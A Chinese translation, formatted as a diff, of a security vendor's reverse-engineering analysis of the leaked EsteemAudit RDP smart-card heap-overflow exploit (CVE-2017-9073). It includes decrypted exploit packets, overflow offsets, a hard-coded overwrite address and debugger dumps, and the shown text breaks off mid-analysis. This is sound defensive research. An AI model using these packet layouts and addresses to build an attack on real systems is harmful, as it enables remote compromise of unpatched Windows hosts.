@@ -1,0 +1,775 @@
+# 【技术分享】NSA武器库：CVE-2017-9073 EsteemAudit分析
+
+阅读量 **265381**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2017-06-05 14:50:26
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章来源：paloaltonetworks.com
+
+原文地址：<http://researchcenter.paloaltonetworks.com/2017/05/unit42-dissection-esteemaudit-windows-remote-desktop-exploit/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+****
+
+**  
+**
+
+翻译：[ **WeaponX**](http://bobao.360.cn/member/contribute?uid=2803578480)
+
+预估稿费：200RMB
+
+投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
+
+**  
+**
+
+**背景**
+
+四月份，一个名为“影子经纪人”的组织发布了一部分他们从NSA窃取的漏洞利用工具，主要是针对windows操作系统。其中最著名就是被勒索软件WanaCryp0t利用的exploit"EternalBlue"。另一个被放出利用工具针对的CVE-2017-9073叫做"EsteemAudit"，是一个Windows
+2003和Windows XP上RDP(Remote Desktop
+Protocol，远程桌面协议)的利用工具。"EsteemAudit"利用的漏洞影响的操作系统微软均已不再支持(2014年结束对XP的支持，2015年结束对2003的支持)，所以微软官方并没有发布这个漏洞的补丁。
+
+  
+
+**EsteemAudit 总览**
+
+RDP远程利用工具名为"EsteemAudit"。使用inter-chunk heap
+overflow方法。Windows智能卡模块的gpkcsp.dll分配的名为key_set，大小为0x24a8的数据结构。在key_set中有一个名为key_data的数据结构大小0x80，这个内存空间用来存放智能卡相关信息。在相邻的内存空间中中存储着两个key_object指针。然而，在gpkcsp!MyCPAcquireContext中调用了内存拷贝函数memcpy，在没有进行边界检查的情况下拷贝了一块用户可完全控制的数据到key_data中，如果攻击者控制的这块内存大于0x80，则相邻内存的指针key_object将会被用户的恶意数据覆盖。EsteemAudit中的代码通过部署一块0xb2-7大小的内存，利用代码中的memcpy拷贝恶意数据到key_data中，随后key_object会被覆盖为0x080190dc这个地址。这个地址正好在gpkcsp.dll的数据段中，随后EsteemAudit会在这个地址部署恶意数据。exploit会将用户控制的数据放到全局变量中去，地址是0x080190d8，随后函数gpkcsp!ReleaseProvider会释放C++对象call
+[vatble+8]，这时就控制了EIP。最终，通过使用SharedUserData技术使用syscall调用syscall
+id为0x8f的函数VirtualProtect修改shellcode内存的执行权限，然后调用shellcode第一阶段就完成了。
+
+  
+
+**介绍**
+
+RDP远程代码执行漏洞很多，不过幸运的是在NT4/Win98后没有任何利用代码被公开发布。然而在2017年4月，影子经纪人公布出的从NSA窃取工具包含了Windows
+XP和Windows
+2003操作系统上RDP远程代码执行漏洞的利用工具EsteemAudit。在本文中，我们将首先介绍RDP协议的内部机制，随后分析EsteemAudit.exe本身。接着，我们会分析RDP协议在用户态和内核态是如何工作的、inter-chunk heap overflow是如何发生的、如何利用inter-chunk heap
+overflow在有漏洞的操作系统上来执行shellcode。最终我们会介绍在没有patch的情况下如何防御这个漏洞。
+
+  
+
+**架构和组件**
+
+[终端服务架构](https://technet.microsoft.com/en-us/library/cc755399.aspx)主要分为四部分：
+
+**multi-user kernel**
+
+**Remote Desktop client**
+
+**Terminal Services Licensing service**
+
+**Session Directory Services**
+
+下表是终端服务的组件及说明
+
+Nicolas Collignon在论文中[Tunneling TCP over
+RDP](http://www.hsc.fr/ressources/presentations/ossir_rdp/rdp2tcp.pdf)描述了各个组件之间的联系。
+
+在内核态，相关的组件在rdpwd.sys中，负责MCS(Multipoint Communication Service)协议栈。RDP
+PDU(Protocol Data Unit，协议数据单元)在此模块被解密并解析。
+
+在用户态，winlogon组件负责客户端的认证。例如，如果一个客户端请求智能卡认证，winlogon.exe会运行智能卡模块与客户端交互。
+
+  
+
+**RDP 协议**
+
+通过对远程桌面服务的简要介绍，我们可以深入了解RDP协议中的被EsteemAudit利用的含有漏洞的模块。在MSDN中有一些RDP的说明文档<https://msdn.microsoft.com/en-us/library/jj712081.aspx>。[[MS-RDPBCGR]: Remote Desktop Protocol: Basic
+Connectivity and Graphics Remoting](https://msdn.microsoft.com/en-us/library/cc240445.aspx)介绍了RDP协议的基本情况，[[MS-RDPESC]: Remote Desktop Protocol:
+Smart Card Virtual Channel Extension](https://msdn.microsoft.com/en-us/library/cc242596.aspx)介绍了RDP协议的一些扩展模块。还有一些文档针对指定的扩展模块进行的描述，例如[[MS-RDPESC]:
+Remote Desktop Protocol: Smart Card Virtual Channel
+Extension](https://msdn.microsoft.com/en-us/library/cc242596.aspx)。在OSSIR
+2010中，Aurélien Bordes在他的议题中列出了所有RDP的扩展模块。
+
+为了深入分析，我们阅读了如下文档：
+
+[[MS-RDPBCGR] – Remote Desktop Protocol: Basic Connectivity and Graphics
+Remoting](https://msdn.microsoft.com/en-us/library/cc240445.aspx)
+
+[[MS-RDPESC] – Remote Desktop Protocol: Smart Card Virtual Channel
+Extension](https://msdn.microsoft.com/en-us/library/cc242596.aspx)
+
+[[MS-RDPEFS] – Remote Desktop Protocol: File System Virtual Channel
+Extension](https://msdn.microsoft.com/en-us/library/cc241305.aspx)
+
+[[MS-RPCE] – Remote Procedure Call Protocol
+Extensions.](https://msdn.microsoft.com/en-us/library/cc243560.aspx)
+
+MS-RDPBCGR基于ITU(International Telecommunication
+Union，国际电信联盟)的[T.120](https://www.itu.int/rec/T-REC-T.120-200701-I/en)系列协议。T.120包含很多其他的标准，例如使用X.224标准用来阐述传输层协议如何交互。[X.224](https://www.itu.int/rec/T-REC-X.224/en)标准阐述了我们看到的request
+PDU和Confirm PDU需要使用何种加密方法进行RDP数据包加密。
+
+在下放的示例中，X.224请求中的encryptionMethods标志位被设置成了0x00000012，代表客户端请求使用128-bit的RC4进行加密[128BIT_ENCRYPTION_FLAG
+0x00000002]
+
+服务端在X.224 confirm PDU中设置encryptionMethod标志位0x00000002(128-bit RC4)确认使用128-bit
+RC4加密。
+
+本文不再阐述RDP连接过程接下来的步骤，详细文档可在[[MS-RDPBCGR] – Remote Desktop Protocol: Basic
+Connectivity and Graphics Remoting](https://msdn.microsoft.com/en-us/library/cc240445.aspx)进行查阅。
+
+RDP连接建立完成后，客户端和服务器段的PDU会使用协商的加密算法进行加密。下图是被加密的PDU实例
+
+PDU中的数据如下
+
+    
+    
+    64 00 04 03 eb 70 81 56 -> PER encoded (ALIGNED variant of BASIC-PER) SendDataRequest
+    initiator = 1005 (0x03ed)
+    channelId = 1003 (0x03eb)
+    dataPriority = high
+    segmentation = begin | end
+    userData length = 0x156 = 342 bytes
+    48 00 -> TS_SECURITY_HEADER::flags = 0x0048 0x0048 (SEC_INFO_PKT | SEC_ENCRYPT
+    00 00 -> TS_SECURITY_HEADER::flagsHi – ignored as flags field does not contain SEC_FLAGSHI_VALID (0x8000)
+    6f 6d 0c d5 b7 0c 5d 7e -> TS_SECURITY_HEADER1::dataSignature
+
+以86 b8 8a a9开始，从偏移为0x51后剩余的数据TS_INFO_PACKET被加密
+
+    
+    
+    len
+    0178d254  0000014a   
+                              J…
+    encrypted
+    038e3c8b  a98ab886 dabad90d d9d8f9e3 8dd5bafa  …………….
+    038e3c9b  1407ea51 883cb6af 21ca2bdb cab1e030  Q…..<..+.!0…
+    038e3cab  d6aaeccd 1c599171 1be8c40d 96d651dc  ….q.Y……Q..
+    038e3cbb  2d018a22 242aac0d 7b58948f 4be28b23  “..-..*$..X{#..K
+    038e3ccb  36cf54c6 52b70939 4064362b 9e37e989  .T.69..R+6d@..7.
+    038e3cdb  9ff09b06 4f862c80 1546198a ac9b03ed  …..,.O..F…..
+    038e3ceb  420acbdf 566591c1 7f471159 0e1d6906  …B..eVY.G..i..
+    038e3cfb  906474f4 476ea91e 4db2edd2 fb464bfd  .td…nG…M.KF.
+    plain
+    038e3c8b  00000000 00000133 001a0000 00000000  ….3………..
+    038e3c9b  00000000 00640061 0069006d 0069006e  ….a.d.m.i.n.i.
+    038e3cab  00740073 00610072 006f0074 00000072  s.t.r.a.t.o.r…
+    038e3cbb  00000000 00020000 0031001c 00320039  ……….1.9.2.
+    038e3ccb  0031002e 00380036 0032002e 00320034  ..1.6.8…2.4.2.
+    038e3cdb  0031002e 003c0000 003a0043 0057005c  ..1…<.C.:..W.
+    038e3ceb  004e0049 0054004e 0053005c 00730079  I.N.N.T..S.y.s.
+    038e3cfb  00650074 0033006d 005c0032 0073006d  t.e.m.3.2..m.s.
+
+我们可以通过文档[MS-RDPBCGR]查阅协议的细节来查看TS_INFO_PACKET。
+
+  
+
+**智能卡扩展**
+
+RDP协议支持客户端使用智能卡模式登录，根据文档[MS-RDPESC]交互的流程如下
+
+EsteemAudit使用SCARD_IOCTL_TRANSMIT与服务器端的智能卡模块进行交互。
+
+文档描述了服务器端响应客户端的数据包的各种类型，其中包含了Transmit_Return类型
+
+服务器端
+
+  
+
+**RDP 利用工具 (EsteemAudit.exe)**
+
+了解RDP的基础知识后，我们看看EsteemAudit具体看了什么。EsteemAudit.exe类似于RDP客户端，完成了和服务器端的RDP协议交互。EsteemAudit使用了RDP协议中的智能卡扩展，向服务器端发送智能卡认证请求。随后RDP服务端会使用智能卡模块gpkcsp.dll处理收到的数据，漏洞在此出现。
+
+**EsteemAudit.exe 总览**
+
+通过逆向EsteemAudit二进制文件，在地址.text:00381009我们找到了名为GoRunExp的函数
+
+    
+    
+    GoRunExp
+    à InitializeInputParameters // 获取配置信息
+    à connect2Target
+    ààinitRDPLib
+    ààemulateSmartCard
+    ààconnect2RDP
+    ààregisterCallback(CallBackFunction)
+    à RecvProcessSendPackets
+    à RdpLib_SendKeyStrokes // 发送空格
+    à RecvProcessSendPackets
+    à buildExpBuffer
+    ààbuild_all_x86
+    àààbuild_overflow_x86
+    àààbuild_exploit_x86
+    àààbuild_egg0_x86
+    ààà// 设置认证码, 异或掩码, 打开载荷, etc
+    ààà build_egg1_payloadxxx
+    à RdpLib_SendKeyStrokes // 发送回车
+    à RecvProcessSendPackets
+    …
+    à RecvProcessSendPackets
+    àà//发送智能卡认证重定向请求，接收和处理响应，与服务器端进行交互，随后发送ExpBuffer(包含overflow buffer, exploit 和 egg0 buffer)在服务器端控制EIP，最后发送结束响应给服务器端完成第一阶段利用。
+    àà//to be mentioned, 注册的回调函数connect2Target会被用来处理响应和打印一些类似与 “SELECT_FILE – GPK Card MF”, “GET_RESPONSE – data unit size”, “GET_RESPONSE – serial number”的日志.
+
+我们发现在准备阶段，完成了与目标机器的连接和构建漏洞利用数据包。RecvProcessSendPackets被多次调用用于接收和处理服务器端的响应、并根据响应来发送数据。RecvProcessSendPackets完成了与RDP服务器端利用智能卡交互的所有细节，我们会在接下来的章节中详细阐述。当然，我们会注重函数如何构造数据包而不会阐述函数的细节。
+
+  
+
+**缓冲区溢出数据包分析**
+
+在构造用于溢出的数据包的时，仅有两个字段是有实际意义的：偏移为0x8d中的值、偏移为0x91值（0x9000），其他字段都是填充的随机数据。
+
+为了观察客户端发送的完整的数据，我们查看了发送的用于溢出的数据包。
+
+如前面章节所述，在偏移为0x51，名为TS_INFO_PACKET被加密过了。我们观察到了客户端中用来加密TS_INFO_PACKET数据的函数为Libeay32!RC4
+function。
+
+我们可以通过简单的调试获取到了RC4解密的函数原型RC4 function — RC4(key, len, in, out)
+
+通过在解密函数前后下断点，可以得到加密前的数据和加密后的数据。
+
+    
+    
+    bu image00380000+0xab24 “.echo len;dc esp+10 L1;.echo rc4_in_buffer;dc poi(esp+8);gc”
+    bu image00380000+0xab39 “.echo rc4_out_buffer;dc poi(esp+0c);gc”
+
+下面我们给出TS_INFO_PACKET的内容
+
+    
+    
+    len
+    0178cf98  000000fc                             ….
+    encrypted
+    038e8d6b  0649efba dcb9b66b f63f676c a2ddcc3b  ..I.k…lg?.;…
+    038e8d7b  56e1fb2e c9ed4e9c bf566979 4d9e3868  …V.N..yiV.h8.M
+    038e8d8b  5dffb177 af4531e2 cd87df84 18a3afff  w..].1E………
+    038e8d9b  56c96e10 7dd116d9 f1db47e2 b65bba04  .n.V…}.G….[.
+    038e8dab  5d8892ca 324864cb 70bc4793 82be0c5b  …].dH2.G.p[…
+    038e8dbb  d5737937 512ce129 21738638 ca18a61a  7ys.).,Q8.s!….
+    038e8dcb  58a5f061 fe8af8db f6c40f83 a975c925  a..X……..%.u.
+    038e8ddb  7da42561 8e0a740f b10381b2 ef4f3c00  a%.}.t…….<O.
+    …
+    decrypted
+    038e8d6b  000000f4 00000003 49434472 00000000  ……..rDCI….
+    038e8d7b  00000001 00000000 000000e0 00081001  …………….
+    038e8d8b  cccccccc 000000c0 00000000 00000000  …………….
+    038e8d9b  00000000 000000b2 00000001 000000b2  …………….
+    038e8dab  fce3940b f2c3bad3 7134f185 b595ac48  ……….4qH…
+    038e8dbb  2d8186ec 56e66ee1 ca0e854f e618d890  …-.n.VO…….
+    038e8dcb  fcf78fcf 6972d722 8a3307d7 e1715046  ….”.ri..3.FPq.
+    038e8ddb  6d3184f2 7eb82735 0c1d6f4b e6a262fe  ..1m5′.~Ko…b..
+    Protocol details [references: [MS-RDPESC].pdf, [MS-RDPEFS].pdf, [MS-RPCE].pdf]
+    000000f4 ->CodePage
+    00000003 ->Flags
+    Device Control Response (DR_CONTROL_RSP)
+    ->DeviceIoReply (16 bytes): DR_DEVICE_IOCOMPLETION
+    4472 ->RDPDR_CTYP_CORE 0x4472
+    4943 ->PAKID_CORE_DEVICE_IOCOMPLETION 0x4943
+    00000000 ->DeviceId (4 bytes)
+    00000001 ->CompletionId (4 bytes)
+    00000000 ->IoStatus (4 bytes)
+    000000e0 ->OutputBufferLength (4 bytes)
+    ->OutputBuffer (variable)
+    00081001 cccccccc Type Serialization Version 1 header
+    000000c0 ->ObjectBufferLength (4 bytes)
+    00000000 ->Filler (4 bytes)
+    00000000 ->ReturnCode
+    00000000 ->dwProtocol
+    000000b2 ->cbRecvLength
+    ->pbExtraBytes
+    00000001 000000b2
+    fce3940b f2c3bad3 7134f185 b595ac48
+    2d8186ec 56e66ee1 ca0e854f e618d890
+    fcf78fcf 6972d722 8a3307d7 e1715046
+    6d3184f2 7eb82735 0c1d6f4b e6a262fe
+
+继续执行程序，随后我们从内存中dump出了触发缓冲区溢出的两个关键字段
+
+    
+    
+    WINDBG>dc 04fdd650+8d
+    04fdd6dd  080190dc 00009000 d7d93015 9dd1e4b1  .........0......
+
+地址0x080190dc我们在前面的章节介绍过，不再阐述。
+
+  
+
+**漏洞利用数据包分析**
+
+在构造数据包的过程中，我们发现了一些有趣的字段，如0x11111111, 0x22222222和0x7ffe0300
+
+我们使用解密缓冲区溢出数据包的方法解密漏洞利用数据包，得到
+
+    
+    
+    encrypted
+    038e9d83  0d76b81e 51331ed0 b3b4b29d ba4a1aaa  ..v…3Q……J.
+    038e9d93  ad0b26e1 c15daa1e 20079871 a18afe91  .&….].q.. ….
+    038e9da3  46d26828 a8883de7 8b54718e 33ebf243  (h.F.=…qT.C..3
+    038e9db3  9d3d556b f8a4f6f8 4a29500c 5d06bd19  kU=……P)J…]
+    038e9dc3  e6099604 4bc7dc66 92103b5e 6da27faa  ….f..K^;…..m
+    038e9dd3  07420e27 c95b5664 79d50284 f7bbd1d3  ‘.B.dV[….y….
+    038e9de3  79c389e1 f795e1cf bcb35b4d 69d0ef0c  …y….M[…..i
+    038e9df3  92beeadf 9010b061 763848d5 bc032358  ….a….H8vX#..
+    …
+    Decrypted
+    038e9d83  00000204 00000003 49434472 00000000  ……..rDCI….
+    038e9d93  00000001 00000000 000001f0 00081001  …………….
+    038e9da3  cccccccc 000001d0 00000000 00000000  …………….
+    038e9db3  00000000 000001c0 00000001 000001c0  …………….
+    038e9dc3  ada0d86e 08011e7a 0801118e 08005e85  n…z……..^..
+    038e9dd3  0800bedd 11111111 2a6bd248 972dc73e  ……..H.k*>.-.
+    038e9de3  00000000 6431e6f0 08011fef 08019078  ……1d….x…
+    038e9df3  abc45491 22222222 00000000 316f482f  .T..””””…./Ho1
+    …
+
+漏洞利用数据包，也是一个Device Control
+Response(DR_CONTROL_RSP)，应为设置了标志为DR_DEVICE_IOCOMPLETION
+(0x49434472)。这和之前描述的缓冲区溢出的数据包一致。
+
+第一阶段最后两个数据包是Select_MF和End Response。这里我们只展示被解密后的数据。
+
+    
+    
+    len
+    0178cf98  0000004c                             L…
+    plain
+    038ead9b  00000044 00000003 49434472 00000000  D…….rDCI….
+    038eadab  00000001 00000000 00000030 00081001  ……..0…….
+    038eadbb  cccccccc 00000010 00000000 00000000  …………….
+    038eadcb  00000000 00000002 00000001 00000002  …………….
+    038eaddb  00000090 00000000 00000000
+
+这里pExtraBytes长度为2，接下来的两个额外字节分别是90 00在服务器上会被智能卡模块处理。
+
+    
+    
+    len
+    0178cf98  0000003c
+
+pExtraBytes长度为0，是一个结束的响应包。这个数据包完成了EsteemAudit与客户端的交互，接着我们看看服务器端如何处理这些数据。
+
+  
+
+**RDP 服务器端**
+
+在看完EsteemAudit和RDP服务器端交互的数据包各个字段的具体含义后，接下来我们关注服务器端如何处理这些数据、漏洞是如何被触发的和如何完成漏洞利用。
+
+**内核态**
+
+下面列出的两个调用栈信息直接展示了DEVICE_IO的处理流程。termdd是一个核心分发器(dispatcher)，RDPWD负责MSC协议栈，我们可以通过函数RDPWD!MCSIcaRawInput获取从客户端发送的原始数据。接下来的一些函数会将前面提到的RDP协议一层一层的解析。
+
+    
+    
+    kd> k
+    # ChildEBP RetAddr
+    00 baf3b32c f6e134ef rdpdr!DrExchangeManager::RecognizePacket+0x8
+    01 baf3b350 f6e12e34 rdpdr!DrSession::ReadCompletion+0x95
+    02 baf3b368 8081d741 rdpdr!DrSession::ReadCompletionRoutine+0x38
+    03 baf3b398 f76895d8 nt!IopfCompleteRequest+0xcd
+    04 baf3b3d4 f768a0d2 termdd!IcaChannelInputInternal+0x1f0
+    05 baf3b3fc ba1a26e1 termdd!IcaChannelInput+0x3c
+    06 baf3b430 ba19c3c1 RDPWD!WDW_OnDataReceived+0x181
+    07 baf3b458 ba19c1b9 RDPWD!SM_MCSSendDataCallback+0x159
+    08 baf3b4c0 ba19bfe0 RDPWD!HandleAllSendDataPDUs+0x155
+    09 baf3b4dc ba1b9ba4 RDPWD!RecognizeMCSFrame+0x32
+    0a baf3b504 ba19b06b RDPWD!MCSIcaRawInputWorker+0x346
+    0b baf3b52c f768d194 RDPWD!MCSIcaRawInput+0x65
+    0c baf3b550 baa92fcb termdd!IcaRawInput+0x58
+    0d baf3bd90 f768c265 TDTCP!TdInputThread+0x371
+    0e baf3bdac 809418f4 termdd!_IcaDriverThread+0x4d
+    0f baf3bddc 80887f4a nt!PspSystemThreadStartup+0x2e
+    10 00000000 00000000 nt!KiThreadStartup+0x16
+    kd> k
+    # ChildEBP RetAddr
+    00 f5a8b254 f6e14f22 rdpdr!RxLowIoCompletion+0x3a
+    01 f5a8b260 f6e15291 rdpdr!DrDevice::CompleteRxContext+0x2a
+    02 f5a8b284 f6e158b0 rdpdr!DrDevice::CompleteBusyExchange+0x4d
+    03 f5a8b2cc f6e164b2 rdpdr!DrDevice::OnDeviceControlCompletion+0x116
+    04 f5a8b2f0 f6e1269d rdpdr!DrDevice::OnDeviceIoCompletion+0x1ee
+    05 f5a8b310 f6e1285a rdpdr!DrExchangeManager::OnDeviceIoCompletion+0x55
+    06 f5a8b324 f6e1351f rdpdr!DrExchangeManager::HandlePacket+0x26
+    07 f5a8b350 f6e12e34 rdpdr!DrSession::ReadCompletion+0xc5
+    08 f5a8b368 8081d741 rdpdr!DrSession::ReadCompletionRoutine+0x38
+    09 f5a8b398 f76c95d8 nt!IopfCompleteRequest+0xcd
+    0a f5a8b3d4 f76ca0d2 termdd!IcaChannelInputInternal+0x1f0
+    0b f5a8b3fc f53856e1 termdd!IcaChannelInput+0x3c
+    0c f5a8b430 f537f3c1 RDPWD!WDW_OnDataReceived+0x181
+    0d f5a8b458 f537f1b9 RDPWD!SM_MCSSendDataCallback+0x159
+    0e f5a8b4c0 f537efe0 RDPWD!HandleAllSendDataPDUs+0x155
+    0f f5a8b4dc f539cba4 RDPWD!RecognizeMCSFrame+0x32
+    10 f5a8b504 f537e06b RDPWD!MCSIcaRawInputWorker+0x346
+    11 f5a8b52c f76cd194 RDPWD!MCSIcaRawInput+0x65
+    12 f5a8b550 f55b2fcb termdd!IcaRawInput+0x58
+    13 f5a8bd90 f76cc265 TDTCP!TdInputThread+0x371
+    14 f5a8bdac 809418f4 termdd!_IcaDriverThread+0x4d
+    15 f5a8bddc 80887f4a nt!PspSystemThreadStartup+0x2e
+    16 00000000 00000000 nt!KiThreadStartup+0x16
+
+我们可以从IDA
+pro中的注释看到RDPWD!MCSIcaRawInputWorker调用RDPWD!RecognizeMCSFrame时srcBuf的内容。
+
+我们还可以看到RDPWD!RecognizeMCSFrame如何解析PER
+
+当MCS协议栈解析完成后，RDPWD会解析TS_DATA_INFO。TS_DATA_INFO中被加密的数据会被SM_MCSSendDataCallback调用SMDecryptPacket->DecryptData->rc4进行解密。
+
+我们在可以在RDPWD!rc4下断点来看服务端解密前和解密后的数据，类似之前的libeay32。
+
+接着SM_MCSSendDataCallback函数会调用WDW_OnDataReceived来处理被解密的数据。
+
+随后，函数会调用termdd!IcaChannelInput来向不同的channel派发被解密的数据。这个例子中，EsteemAudit发送的缓冲区溢出数据包是DEVICE_IO类型的，且属于File
+System Virtual Channel Extension。将会被RDPDR模块解析。
+
+我们在缓冲区溢出数据包中可以找到DR_DEVICE_IOCOMPLETION [MS-RDPEFS.pdf]头部
+
+    
+    
+    000000f4 ->CodePage
+    00000003 ->Flags
+    Device Control Response (DR_CONTROL_RSP)
+    ->DeviceIoReply (16 bytes): DR_DEVICE_IOCOMPLETION
+    4472 ->RDPDR_CTYP_CORE 0x4472
+    4943 ->PAKID_CORE_DEVICE_IOCOMPLETION 0x4943
+
+在RDPDR模块中，我们可以看到虚表虚表中的函数被用来识别和处理数据包
+
+如果服务器端收到了被标记为RDPDR_HEADER的数据包，对应的类会调用RecognizePacket函数
+
+EsteemAudit发送的缓冲区溢出数据包和漏洞利用数据包设置了0x49434472的标志位。0x4472被设备重定向核心组件(Device
+redirector core component)使用，0x4943用来做Device I/O响应。
+
+在识别数据包类型后，rdpdr!DrSession::ReadCompletion会调用HandlePacket来解析数据包。我们可以看到OnDeviceControlCompletion函数处理数据包头部。
+
+在处理完数据包后，我们可以看到rdpdr!DrDevice::CompleteRxContext通过IO通知已经处理完成相关的数据包。其他模块被通知继续处理剩下的数据包，在这里是pbExtraBytes。
+
+**用户态**
+
+在用户态中，winlogon.exe调用了智能卡模块，类似gpkcsp，scredir和winscard来和客户端进行交互。
+
+首先，我们看看函数调用栈。这个调用栈是从内核态向用户态拷贝用户发送的数据pbExtraBytes时的。我们可以看到客户端发送到服务器端的数据从内核态进入用户态的流程。
+
+    
+    
+    0:003> k
+    ChildEBP RetAddr
+    00fce058 5cd45619 scredir!_CopyReturnToCallerBuffer
+    00fce104 723642b0 scredir!SCardTransmit+0x194
+    00fce180 08005c32 WinSCard!SCardTransmit+0x76
+    00fce1b0 0800921d gpkcsp!DoSCardTransmit+0x3d
+    00fce41c 0800e2dd gpkcsp!WriteTimestamps+0x679
+    00fcf39c 08004acb gpkcsp!MyCPAcquireContext+0x817
+    00fcf708 77f50909 gpkcsp!CPAcquireContext+0x26e
+    00fcf7cc 77f50a5f ADVAPI32!CryptAcquireContextA+0x55f
+    00fcf834 0103fd78 ADVAPI32!CryptAcquireContextW+0xa4
+    00fcf864 0104086c winlogon!CSCLogonInit::CryptCtx+0x75
+    00fcf874 010408c1 winlogon!CSCLogonInit::RelinquishCryptCtx+0x10
+    00fcf898 0103a8f5 winlogon!ScHelperGetCertFromLogonInfo+0x22
+    00fcf8bc 77c50193 winlogon!s_RPC_ScHelperGetCertFromLogonInfo+0x3f
+    00fcf8e0 77cb33e1 RPCRT4!Invoke+0x30
+    00fcfce0 77cb35c4 RPCRT4!NdrStubCall2+0x299
+    00fcfcfc 77c4ff7a RPCRT4!NdrServerCall2+0x19
+    00fcfd30 77c7e732 RPCRT4!DispatchToStubInCNoAvrf+0x38
+    00fcfd48 77c5042d RPCRT4!DispatchToStubInCAvrf+0x14
+    00fcfd9c 77c50353 RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x11f
+    00fcfdc0 77c511dc RPCRT4!RPC_INTERFACE::DispatchToStub+0xa3
+    00fcfdfc 77c512f0 RPCRT4!LRPC_SCALL::DealWithRequestMessage+0x42c
+    00fcfe20 77c58678 RPCRT4!LRPC_ADDRESS::DealWithLRPCRequest+0x127
+    00fcff84 77c58792 RPCRT4!LRPC_ADDRESS::ReceiveLotsaCalls+0x430
+    00fcff8c 77c5872d RPCRT4!RecvLotsaCallsWrapper+0xd
+    00fcffac 77c4b110 RPCRT4!BaseCachedThreadRoutine+0x9d
+    00fcffb8 7c824829 RPCRT4!ThreadStartRoutine+0x1b
+    WARNING: Stack unwind information not available. Following frames may be wrong.
+    00fcffec 00000000 kernel32!GetModuleHandleA+0xdf
+
+gpkcsp!MyCPAcquireContext这个函数是负责发送，接受和处理智能卡数据包的，且与EsteemAudit中的函数RecvProcessSendPackets是相关的。
+
+在介绍这个函数前，我们先看看scredir!SCardTransmit。这个函数被函数gpkcsp!DoSCardTransmit调用，是发送和接受智能卡数据的基础函数。
+
+函数_SendSCardIOCTL的第一个参数为0x900d0代表SCARD_IOCTL_TRANSMIT。发送数据的和接受数据的数据结构_Transmit_Call和_Transmit_Return之前已经介绍过了。随后Transmit_Return_Decode会解码并处理从内核中得到的数据。scredir!_CopyReturnToCallerBuffe这个函数拷贝的数据来自于客户端发送的数据，且为保存在地址0x080190d8中的全局变量。这意味这缓冲区溢出数据包和漏洞利用数据包的数据将会被拷贝到地址0x080190d8中。这就是为什么在缓冲区溢出数据包和漏洞利用数据包中有这个地址被硬编码地址的原因。
+
+接下来我们介绍gpkcsp!MyCPAcquireContext函数和整个的利用过程。函数SCardEstablishContext和ConnectToCard的细节不在此阐述，不过我们会介绍程序处理缓冲区溢出包的流程。
+
+这是一个名为ProvCont的全局变量，被存储在大小是0x24a8的堆中
+
+    
+    
+    0:003> dc gpkcsp!ProvCont (08176dd8)
+    08176dd8  02cdcb58                             X…
+    0:003> !heap -p -a 0x2cdcb58
+    address 02cdcb58 found in
+    _DPH_HEAP_ROOT @ 3a1000
+    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize –         VirtAddr         VirtSize)
+    3a3c80:          2cdcb58             24a8 –          2cdc000             4000
+    7c96d97a ntdll!RtlAllocateHeap+0x00000e9f
+    77b8d08c msvcrt!malloc+0x0000006c
+    08012599 gpkcsp!GMEM_Alloc+0x0000000e
+    0800a937 gpkcsp!DllMain+0x00000090
+    080120fc gpkcsp!_DllMainCRTStartup+0x00000052
+    7c94a352 ntdll!LdrpCallInitRoutine+0x00000014
+    7c963465 ntdll!LdrpRunInitializeRoutines+0x00000367
+    7c964311 ntdll!LdrpLoadDll+0x000003cd
+    7c964065 ntdll!LdrLoadDll+0x00000198
+    7c801bf3 kernel32!LoadLibraryExW+0x000001b2
+    7c801dbd kernel32!LoadLibraryExA+0x0000001f
+    7c801df3 kernel32!LoadLibraryA+0x000000b5
+    77f42fef ADVAPI32!CryptAcquireContextA+0x0000045c
+    77f50a5f ADVAPI32!CryptAcquireContextW+0x000000a4
+    0103fd78 winlogon!CSCLogonInit::CryptCtx+0x00000075
+    0104086c winlogon!CSCLogonInit::RelinquishCryptCtx+0x00000010
+    010408c1 winlogon!ScHelperGetCertFromLogonInfo+0x00000022
+    0103a8f5 winlogon!s_RPC_ScHelperGetCertFromLogonInfo+0x0000003f
+    77c50193 RPCRT4!Invoke+0x00000030
+    77cb33e1 RPCRT4!NdrStubCall2+0x00000299
+    77cb35c4 RPCRT4!NdrServerCall2+0x00000019
+    77c4ff7a RPCRT4!DispatchToStubInCNoAvrf+0x00000038
+    77c7e732 RPCRT4!DispatchToStubInCAvrf+0x00000014
+    77c5042d RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x0000011f
+    77c50353 RPCRT4!RPC_INTERFACE::DispatchToStub+0x000000a3
+    77c511dc RPCRT4!LRPC_SCALL::DealWithRequestMessage+0x0000042c
+    77c512f0 RPCRT4!LRPC_ADDRESS::DealWithLRPCRequest+0x00000127
+    77c58678 RPCRT4!LRPC_ADDRESS::ReceiveLotsaCalls+0x00000430
+    77c58792 RPCRT4!RecvLotsaCallsWrapper+0x0000000d
+    77c5872d RPCRT4!BaseCachedThreadRoutine+0x0000009d
+    77c4b110 RPCRT4!ThreadStartRoutine+0x0000001b
+    7c824829 kernel32!BaseThreadStart+0x00000034
+
+调用DoSCardTransmit处理缓冲区溢出数据包并将数据包保存在0x080190d8后，MyCPAcquireContext初始化KeyData(0x80)并且从0x080190d8拷贝客户端发送的数据(大小为0x2b-7)到这块内存中
+
+通过调试可以看到key_object的溢出情况
+
+    
+    
+    0:003> dc 02cdcb58+a0+b8-20
+    02cdcc90  b7314210 544f2b0f 34059cf0 ead224e5  .B1..+OT…4.$..
+    02cdcca0  22ef2496 b2dcb268 9c36556f 159e7181  .$.”h…oU6..q..
+    02cdccb0  080190dc 00009000 70e2a252 b67b7cc7  ……..R..p.|{.
+    02cdccc0  62937b2c afe0bbbd 93606931 dcdba152  ,{.b….1i`.R…
+    02cdccd0  00cd84d1 00000000 00000000 00000000  …………….
+    02cdcce0  00000000 00000000 00000000 00000000  …………….
+    02cdccf0  00000000 00000000 00000000 00000000  …………….
+    02cdcd00  00000000 00000000 00000000 00000000  …………….
+
+在溢出keyobject后，我们可以观察gpkcsp!MyCPAcquireContext如何处理接下来的数据包和EIP是如何被控制的。
+
